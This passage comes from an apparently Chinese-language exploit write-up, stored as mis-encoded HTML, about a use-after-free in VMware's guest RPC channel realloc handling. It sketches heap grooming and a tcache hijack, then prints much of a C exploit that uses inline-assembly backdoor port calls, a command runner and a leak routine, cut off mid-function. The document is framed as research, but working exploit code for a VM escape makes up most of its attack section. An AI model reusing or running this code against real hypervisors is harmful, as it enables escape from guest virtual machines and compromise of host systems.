src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9589e548acbe430d797a4b712db305520f4cd8bd.png" alt="å›¾ç‰‡.png"></p><p>guestè·å¾—ï¼Œè¿”å›çš„é•¿åº¦ï¼Œé€»è¾‘ç®€å•ã€‚</p><h4 id="Recieve-RPC-reply-data"><a href="#Recieve-RPC-reply-data" class="headerlink" title="Recieve_RPC_reply_data"></a>Recieve_RPC_reply_data</h4><p>æ‰§è¡ŒæŒ‡ä»¤ä¹‹åè¿”å›çš„æ•°æ®ã€‚</p><p>é€»è¾‘å’Œå‘é€å·®ä¸å¤šï¼ŒåŒæ ·çš„å…ˆæ”¶åˆ°é•¿åº¦ï¼Œç„¶ååˆ¤æ–­é•¿åº¦ï¼Œä¸€æ¬¡æ¥å—å››ä¸ªå­—èŠ‚ï¼Œç„¶åå†æŠŠæ•°æ®è½¬ç§»åˆ°ç¼“å†²åŒºã€‚æœ€åè®¾ç½®flagä¸ºå‘é€å®Œæ¯•ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5554b4d6edff9e2280409f6bd2c8cd2c86fea21f.png" alt="å›¾ç‰‡.png"></p><h4 id="Finish-receiving-RPC-reply-amp-Close-RPC-channel"><a href="#Finish-receiving-RPC-reply-amp-Close-RPC-channel" class="headerlink" title="Finish_receiving_RPC_reply &amp; Close_RPC_channel"></a>Finish_receiving_RPC_reply &amp; Close_RPC_channel</h4><p>è¿™ä¸¤ä¸ªéƒ¨åˆ†ä¹Ÿè¾ƒä¸ºç®€å•ï¼Œå‰è€…åœ¨rw2018è¯¦ç»†åˆ†æè¿‡ï¼Œåè€…å°±æ˜¯close channelã€‚åŒæ—¶è®¾ç½®flagä¸º1ï¼Œæ•´ä¸ªæŒ‡ä»¤å¤„ç†å‘é€æ¥æ”¶æµç¨‹ç»“æŸã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>å‰é¢è¯´è¿‡äº†ï¼Œæ¼æ´å­˜åœ¨äºreallocä¸­ï¼Œåˆ©ç”¨è¯¥UAFå¯ä»¥é€ æˆæ³„éœ²ç­‰æ“ä½œã€‚å®é™…ä¸Šleakå’Œåˆ©ç”¨çš„æ€è·¯è¿˜æ˜¯å’Œrwå·®ä¸å¤šçš„ã€‚</p><p>æ­¤å¤„çš„UAFä½ç½®åœ¨reallocç¯èŠ‚ä¹Ÿå°±æ˜¯è®¾ç½®å‘é€é•¿åº¦çš„ç¯èŠ‚ï¼Œä½†æ˜¯é€ æˆUAF leakè™šè¡¨è¿˜æ˜¯éœ€è¦å…ˆè®¾ç½®ä¸€ä¸ª0x100å¤§å°çš„ç¼“å†²åŒºã€‚</p><ul><li>å¼€å¯channel A channel B</li><li>Aè®¾ç½®bufferä¸º0x100ï¼Œ B ä½¿ç”¨info getä¹Ÿè®¾ç½®ä¸º0x100</li><li>ç„¶åset_lenè§¦å‘Aæ¼æ´ï¼ŒB getè¿™ä¸ªbufferï¼ŒAå†æ¬¡è§¦å‘æ¼æ´ã€‚æ­¤æ—¶B çš„bufferå·²ç»åœ¨tcacheé‡Œäº†</li><li>è°ƒç”¨dnd_visonå‡½æ•°å†™å…¥è™šè¡¨</li><li>leak</li></ul><p>æ¼æ´åˆ©ç”¨ä¹Ÿæ˜¯å’Œrwä¸€æ ·ï¼Œç›´æ¥tcacheåŠ«æŒå³å¯</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p>ä¸»è¦çš„æµç¨‹è¿˜æ˜¯å¤åˆ¶rw2018çš„ï¼Œæ”¹åŠ¨å°‘éƒ¨åˆ†å³å¯ã€‚è¿˜æ˜¯å¯¹å¸ˆå‚…çš„è„šæœ¬åˆ†æ</p><p>leakå‡½æ•°</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4b9fefc7745ee94ae07cccc09bfdcb91cf0fb928.png" alt="å›¾ç‰‡.png"></p><p>å®Œæ•´çš„channel 0 å‘é€æŒ‡ä»¤</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6ac75d5867ddf6d2826a4909d4a23d798ecc4e9.png" alt="å›¾ç‰‡.png"></p><p>channelå‘é€éƒ¨åˆ†info get</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a5dfc228eaf5bbe1046ff8828591417ae8e7d130.png" alt="å›¾ç‰‡.png"></p><p>free channel 0 çš„bufferï¼Œç„¶ååœ¨channel 1reallocå‡ºæ¥ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf4ca0bca038198b936f068479e3d7c86b304719.png" alt="å›¾ç‰‡.png"></p><p>å†æ¬¡free</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6101b8e1bf488c5b22fc638bf5ee6759f7e47d59.png" alt="å›¾ç‰‡.png"></p><p>dnd_verisonæ‰“å…¥è™šè¡¨</p><p>tcacheåŠ«æŒæ“ä½œä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ”¹æ‰äº†è§¦å‘çš„ä½ç½®ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x49435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s21<span class="token operator">=</span> <span class="token string">"info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token 